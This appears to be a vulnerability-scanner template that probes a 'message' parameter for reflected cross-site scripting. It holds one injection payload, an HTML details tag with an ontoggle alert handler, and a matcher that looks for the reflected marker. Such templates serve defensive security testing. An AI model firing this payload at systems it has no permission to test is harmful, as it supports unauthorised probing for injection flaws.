id: xss2-156
name: 'Reflected XSS2 ctx-5 via message'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in message'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      message:
        - '<details open ontoggle=alert(nx2155)>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx2155'
